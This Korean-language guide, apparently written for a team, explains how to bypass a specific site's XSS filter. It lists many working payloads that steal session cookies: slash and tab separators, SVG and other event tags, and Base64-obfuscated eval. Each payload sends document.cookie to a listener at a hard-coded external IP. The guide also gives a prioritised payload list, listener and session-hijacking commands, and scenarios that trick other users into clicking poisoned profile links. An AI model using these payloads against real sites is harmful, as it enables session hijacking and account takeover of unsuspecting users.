# XSS 필터 우회 가이드

## 🔒 현재 필터링 규칙

조원분이 발견한 필터링 규칙:

1. ❌ `<script>` 태그 **완전 차단**
2. ❌ 태그 **소문자화** (ScRiPt → script → 차단)
3. ✅ `<img`, `<img>` **허용** (태그로 인식)
4. ❌ `<img ` **뒤에 공백/문자 오면 차단**
5. ❌ HTML 엔티티 (`<&#105;&#109;&#103;>`) **태그 인식 안됨**
6. ❌ `&lt;img...&gt;` **이스케이프된 형태 동작 안함**
7. ❌ `alert(1)` 같은 **함수도 필터링**

### 테스트 결과

```
✓ 성공: profile.php?email=test@test&full_name=<img src=x onerror
        (여기까지는 동작)

✗ 실패: &lt;img%20src=x%20onerror=fetch(...)&gt;
        (이스케이프됨)

✗ 실패: <img src=x onerror=alert(1)>
        (alert 필터링)
```

---

## 🎯 우회 전략

### 전략 1: 슬래시(/) 구분자 사용 ⭐⭐⭐⭐⭐

**핵심**: `<img ` (공백) 대신 `<img/` (슬래시) 사용

```html
✓ <img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
✓ <img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/>
✓ <img/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
```

**URL 인코딩된 형태**:
```
http://3.34.90.201/profile.php?email=test@test&full_name=%3Cimg/src%3Dx/onerror%3Dfetch%28%22http%3A//3.113.201.239%3A8888/steal%3Fc%3D%22%2Bdocument.cookie%29%3E
```

---

### 전략 2: SVG 태그 사용 ⭐⭐⭐⭐⭐

**핵심**: `<img>` 대신 `<svg>` 사용, `onload` 이벤트 활용

```html
✓ <svg/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
✓ <svg/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/>
```

**장점**:
- `<svg>` 태그는 `<img>` 필터와 다를 수 있음
- `onload`는 페이지 로드 즉시 실행됨

---

### 전략 3: 탭/줄바꿈 문자 사용 ⭐⭐⭐⭐

**핵심**: 공백 대신 탭(`\t`, `%09`) 또는 줄바꿈(`\n`, `%0A`) 사용

```html
✓ <img	src=x	onerror=fetch("...")>
  (탭 문자)

✓ <img%09src=x%09onerror=fetch("...")>
  (URL 인코딩된 탭)

✓ <img
src=x
onerror=fetch("...")>
  (줄바꿈)

✓ <img%0Asrc=x%0Aonerror=fetch("...")>
  (URL 인코딩된 줄바꿈)
```

---

### 전략 4: 이미지 로드 (fetch 없이) ⭐⭐⭐⭐

**핵심**: `fetch()` 대신 `new Image().src` 사용

```html
✓ <img/src=x/onerror=new(Image).src="http://3.113.201.239:8888/steal?c="+document.cookie>
```

**장점**:
- `fetch` 필터링 우회 가능
- 동일한 효과 (HTTP GET 요청)

---

### 전략 5: location 리다이렉트 ⭐⭐⭐

**핵심**: `fetch()` 대신 `location=` 사용

```html
✓ <img/src=x/onerror=location="http://3.113.201.239:8888/steal?c="+document.cookie>
✓ <img/src=x/onerror=location.href="http://3.113.201.239:8888/steal?c="+document.cookie>
```

**단점**:
- 페이지가 리다이렉트됨 (눈에 띔)

---

### 전략 6: Base64 난독화 ⭐⭐⭐⭐

**핵심**: `fetch()` 코드를 Base64로 인코딩

```html
✓ <img/src=x/onerror=eval(atob("ZmV0Y2goImh0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZSk="))>
```

**Base64 디코딩**:
```javascript
fetch("http://3.113.201.239:8888/steal?c="+document.cookie)
```

**장점**:
- `fetch`, `alert` 같은 함수명 필터링 우회

---

### 전략 7: 다른 태그 활용 ⭐⭐⭐

**핵심**: `<img>`, `<svg>` 외 다른 HTML 태그

```html
✓ <details/open/ontoggle=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
✓ <input/onfocus=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/autofocus>
✓ <body/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
✓ <iframe/src="javascript:fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
✓ <video/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
✓ <audio/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
```

---

## 🚀 실전 테스트 방법

### 방법 1: 자동 테스트 스크립트

```bash
# 모든 페이로드 자동 테스트
python3 test_advanced.py

# 결과: advanced_test_results.json
```

### 방법 2: 수동 브라우저 테스트

```
1. 브라우저에서 직접 접속:

http://3.34.90.201/profile.php?email=test@test&full_name=%3Cimg/src%3Dx/onerror%3Dfetch%28%22http%3A//3.113.201.239%3A8888/steal%3Fc%3D%22%2Bdocument.cookie%29%3E

2. 개발자 도구 → Network 탭 확인

3. http://3.113.201.239:8888/steal 로 요청이 가는지 확인
```

### 방법 3: Burp Suite 사용

```
1. Burp Suite로 profile.php 요청 캡처

2. Repeater로 전송

3. full_name 파라미터에 페이로드 삽입:
   <img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>

4. Response에서 태그가 반사되는지 확인
```

---

## 📋 우선순위 페이로드 목록

### Top 10 추천 페이로드 (성공 확률 높은 순)

```html
1. <img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
   (슬래시 구분자, fetch 사용)

2. <svg/onload=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
   (SVG 태그, onload 이벤트)

3. <img/src=x/onerror=new(Image).src="http://3.113.201.239:8888/steal?c="+document.cookie>
   (이미지 로드, fetch 없이)

4. <img/src=x/onerror=eval(atob("ZmV0Y2goImh0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZSk="))>
   (Base64 난독화)

5. <details/open/ontoggle=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
   (details 태그)

6. <input/onfocus=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)/autofocus>
   (input autofocus)

7. <img	src=x	onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
   (탭 구분자)

8. <img
src=x
onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
   (줄바꿈 구분자)

9. <iframe/src="javascript:fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
   (iframe javascript:)

10. <video/src/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>
    (video 태그)
```

---

## 🔍 디버깅 팁

### 페이로드가 작동하지 않을 때

1. **브라우저 콘솔 확인**
   ```javascript
   // 직접 콘솔에서 테스트
   fetch("http://3.113.201.239:8888/steal?c="+document.cookie)
   ```

2. **Response HTML 확인**
   - 페이로드가 반사되는가?
   - 태그가 정상적으로 렌더링되는가?
   - 필터링되어 변형되었는가?

3. **리스너 서버 확인**
   ```bash
   # 3.113.201.239에서
   tail -f stolen_cookies.log
   ```

4. **CORS 오류**
   - `fetch()` 대신 `new Image().src` 사용
   - 또는 `navigator.sendBeacon()` 사용

---

## 🎯 실전 시나리오

### 시나리오 1: 댓글 XSS

```
1. 리스너 서버 시작 (3.113.201.239)
   python3 cookie_listener.py

2. 댓글에 페이로드 삽입
   <img/src=x/onerror=fetch("http://3.113.201.239:8888/steal?c="+document.cookie)>

3. 다른 사용자가 댓글을 볼 때 쿠키 탈취됨

4. 세션 하이재킹
   python3 session_hijacker.py -t http://3.34.90.201/index.php
```

### 시나리오 2: 프로필 XSS

```
1. profile.php?full_name= 에 페이로드 주입

2. 자신의 프로필 페이지 URL을 소셜 엔지니어링으로 전파
   "내 프로필 사진 어때?" → 링크 클릭 유도

3. 링크 클릭한 사용자의 쿠키 탈취

4. 계정 장악
```

---

## 📊 성공 확률 분석

| 우회 기법 | 성공 확률 | 탐지 회피 | 난이도 |
|----------|----------|----------|--------|
| 슬래시 구분자 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 쉬움 |
| SVG 태그 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 쉬움 |
| 탭/줄바꿈 | ⭐⭐⭐⭐ | ⭐⭐⭐ | 쉬움 |
| 이미지 로드 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 쉬움 |
| Base64 난독화 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 중간 |
| location 리다이렉트 | ⭐⭐⭐ | ⭐⭐ | 쉬움 |
| 다른 태그 | ⭐⭐⭐ | ⭐⭐⭐ | 중간 |

---

**준비 완료! 이제 필터를 우회해보세요!**

```bash
# 자동 테스트 실행
python3 test_advanced.py

# 또는 수동으로
# 브라우저에서 직접 URL 접속
```
